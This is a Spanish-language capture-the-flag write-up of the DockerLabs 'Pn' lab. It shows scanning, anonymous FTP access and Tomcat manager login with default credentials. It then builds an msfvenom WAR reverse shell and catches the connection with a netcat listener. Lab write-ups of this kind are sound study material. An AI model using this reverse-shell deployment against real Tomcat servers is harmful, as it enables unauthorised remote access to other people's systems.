# 🧠 Informe de Pentesting – Máquina: `-Pn`

### 💡 Dificultad: Fácil

📦 Plataforma: DockerLabs
🌐 Objetivo: Explicar el proceso realizado durante la resolución de la máquina explotando la subida de archivos de tomcat.

![Despliegue](/pn/Imagenes/logo.png)

---

# 🚀 Despliegue de la Máquina

Se inicia la máquina vulnerable descomprimiendo el archivo proporcionado y ejecutando el script de despliegue incluido.

```bash
unzip bicho.zip
sudo bash auto_deploy.sh pn.tar
```

Una vez desplegada correctamente, la máquina queda disponible dentro de la red Docker.

![Despliegue](/pn/Imagenes/maquina.png)

---

# 📶 Comprobación de Conectividad

Antes de comenzar con la fase de enumeración, se verifica que la máquina objetivo se encuentre activa y responda correctamente a solicitudes ICMP.

```bash
ping -c1 172.17.0.2
```

La respuesta confirma conectividad con el objetivo.

![Despliegue](/pn/Imagenes/ping.png)

---

# 🔍 Escaneo de Puertos

## 🔎 Escaneo Completo

Se realiza un escaneo completo de todos los puertos TCP con el objetivo de identificar servicios expuestos en la máquina.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

### 🧩 Puertos abiertos identificados

| Puerto   | Servicio      |
| -------- | ------------- |
| 21/tcp   | FTP           |
| 8080/tcp | HTTP / Tomcat |

---

## 🧩 Detección de Servicios y Versiones

Después del descubrimiento inicial, se enumeran los servicios y versiones activas.

```bash
nmap -sCV -p21,8080 172.17.0.2
```

El análisis revela que el servicio web corresponde a un servidor Apache Tomcat.

![Puertos](/pn/Imagenes/nmap.png)

---

# 🧭 Reconocimiento Web

## 🖥️ Acceso Inicial

Al acceder desde el navegador a:

```text
http://172.17.0.2:8080
```

Se observa una instalación funcional de Apache Tomcat.

![logs](/pn/Imagenes/pagina.png)

---

# 🗂️ Fuzzing de Directorios

Con el objetivo de identificar rutas ocultas o directorios interesantes, se realiza fuzzing utilizando Gobuster.

```bash
gobuster dir -u http://172.17.0.2:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 404,400 --exclude-length 787
```

Durante el análisis se identifican múltiples rutas disponibles dentro de la aplicación.

![logs](/pn/Imagenes/gobuster.png)

También se detectan directorios adicionales interesantes.

![logs](/pn/Imagenes/gobusterdos.png)

Entre ellos destaca el directorio:

```text
/manager
```

El cual solicita autenticación mediante usuario y contraseña.

---

# 📂 Enumeración FTP

Antes de continuar con el panel de administración, se analiza el servicio FTP disponible en el puerto 21.

Se comprueba que el acceso anónimo se encuentra habilitado.

## 🔑 Acceso Anónimo

```bash
ftp Anonymous@172.17.0.2
```

Una vez autenticados, se listan los archivos disponibles:

```bash
ls
```

Se identifica un archivo `.txt`.

## 📥 Descarga del Archivo

Para descargar el archivo desde el servidor FTP se utiliza:

```bash
get tomcat.txt
```

Aunque el archivo fue descargado correctamente, su contenido no aporta información relevante para la resolución de la máquina.

![logs](/pn/Imagenes/ftpAnonymous.png)

![logs](/pn/Imagenes/descargaftp.png)

---

# 🔐 Acceso al Panel Manager

Se regresa al directorio `/manager`, donde se intenta acceder utilizando credenciales por defecto comunes de Tomcat.

Inicialmente no se obtiene acceso.

Al cancelar la autenticación, el servidor muestra un mensaje de error que contiene ejemplos de credenciales por defecto utilizadas frecuentemente en Apache Tomcat.

![logs](/pn/Imagenes/cancelarmanager.png)

A partir de esta información se investigan listas públicas de credenciales por defecto relacionadas con Tomcat.
También se genera una lista personalizada de usuarios y contraseñas frecuentes para realizar pruebas de autenticación.

Las credenciales válidas resultaron ser:

```text
Usuario: tomcat
Contraseña: s3cr3t
```

Con estas credenciales es posible acceder correctamente al panel de administración.

![logs](/pn/Imagenes/logincredenciales.png)

También es posible acceder al panel desde la opción **Manager App** disponible en la página principal de Tomcat.

---

# 📦 Análisis del Panel Tomcat Manager

Una vez dentro del panel de administración, se analiza la funcionalidad disponible.

Se observa que existe una sección para desplegar aplicaciones mediante archivos `.war`.

![logs](/pn/Imagenes/archivologin.png)

Los archivos WAR (`Web Application Archive`) son paquetes utilizados por aplicaciones Java web.

---

# 📤 Creación y Subida del Archivo WAR

Se genera un archivo WAR utilizando `msfvenom`:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.0.105 LPORT=4445 -f war -o shell.war
```

El archivo se guarda en el directorio actual.

Se puede verificar su creación utilizando:

```bash
ls -la
```

![logs](/pn/Imagenes/subidashell.png)

Posteriormente, desde el panel Tomcat Manager, se selecciona el archivo generado y se procede a subirlo al servidor.

![logs](/pn/Imagenes/apartadosub.png)

Después de la carga exitosa, la nueva aplicación aparece listada dentro del panel de aplicaciones desplegadas.

![logs](/pn/Imagenes/archivosub.png)

![logs](/pn/Imagenes/subido.png)

---

# 🎧 Obtención de Acceso

En la máquina atacante se inicia un listener utilizando Netcat.

```bash
nc -lvnp 4445
```

Posteriormente, se accede desde el navegador a la aplicación subida o directamente a su ruta correspondiente.

Una vez ejecutada la aplicación, se recibe la conexión en la terminal en escucha, obteniendo acceso remoto al sistema.

Finalmente, se logra acceso con privilegios elevados dentro de la máquina objetivo.

![logs](/pn/Imagenes/root.png)

---


